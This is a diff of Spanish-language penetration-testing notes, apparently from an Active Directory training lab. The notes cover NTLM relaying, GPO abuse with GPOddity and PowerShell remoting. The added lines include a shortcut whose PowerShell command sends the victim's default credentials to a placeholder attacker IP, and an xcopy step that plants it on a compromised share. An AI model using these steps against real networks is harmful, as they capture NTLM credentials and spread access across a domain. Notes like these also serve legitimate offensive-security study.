@@ -8,7 +8,7 @@ Tags: #AD #Windows #Powershell #PrivEsc #PowerView #NTLMRelay #Kali
 - Esto habilita la carga de plantillas maliciosas desde una ubicación que podemos controlar 
 ```
 
-![](Captura%20de%20pantalla%202026-02-17%20151823.png)
+![[Pasted image 20260515195214.png]]
 
 ```bash 
 Las partes 1, 2 y 3 del diagrama anterior pertenecen a la parte del 'Relaying' 
@@ -52,12 +52,13 @@ Notas:
 2. Crear un 'shortcut' (acceso directo) llamado 'powershell' en la máquina de atacante Windows y colocarle el siguiente comando en la ruta:  
    
 ❯ powershell.exe -Command "Invoke-WebRequest -Uri 'http://IP_Atacante' -UseDefaultCredentials"
+❯ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://IP_Atacante' -UseDefaultCredentials"
 ```
 
 ```powershell 
 3. Copiar el 'shortcut' (acceso directo) llamado 'powershell' desde Powershell en Windows al directorio del server que ha sido vulnerado para que sea ejecutado por el usuario que contiene la política
 
-❯ xcopy C:\AD\Dowloads\powershell.lnk \\dcorp-ci\AI
+❯ xcopy C:\AD\Dowloads\powershell.lnk \\dcorp-ci\AI\
 ```
 
 ```bash 
@@ -117,4 +118,10 @@ GPOddity es una herramienta para 'abusar de permisos débiles sobre un GPO' y fo
 
 	# r = Indica el host remoto al que te conectas 
 	# cmd = Ejecuta en la máquina remota 'set computername && set username'
+```
+
+```powershell 
+❯ Enter-PSSession -ComputerName dcorp-ci.domain01.local         # Ingresar al server
+	❯ $env:username
+	❯ $env:computername
 ```
